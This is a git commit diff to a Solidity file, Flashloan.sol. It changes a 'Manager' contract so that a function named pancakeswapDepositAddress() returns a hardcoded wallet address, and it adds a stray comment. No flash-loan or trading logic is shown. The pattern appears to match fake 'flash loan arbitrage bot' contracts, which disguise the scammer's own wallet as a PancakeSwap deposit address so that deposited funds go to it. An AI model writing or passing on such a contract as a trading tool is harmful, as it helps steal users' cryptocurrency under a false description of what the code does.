87369f96aa78e7b7ba9f0d91de20c9c533e72e9b
Nakulbhmd <104503701+Nakulbhmd@users.noreply.github.com>
2022-06-10 01:14:38 +0530

    Update Flashloan.sol

--- Flashloan.sol
+++ Flashloan.sol
@@ -1,11 +1,13 @@
 pragma solidity ^0.5.0;
 
 contract Manager {
-        function performTasks() public {
-
-        }
-
-        function pancakeDepositAddress() public pure returns (address) {
-       
-        }
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x74eC72dbA41c6C2458Cb7A6fcbAEc5A8E4a8aBFC;
+    }
 }
+
+//pancakeswapfunction
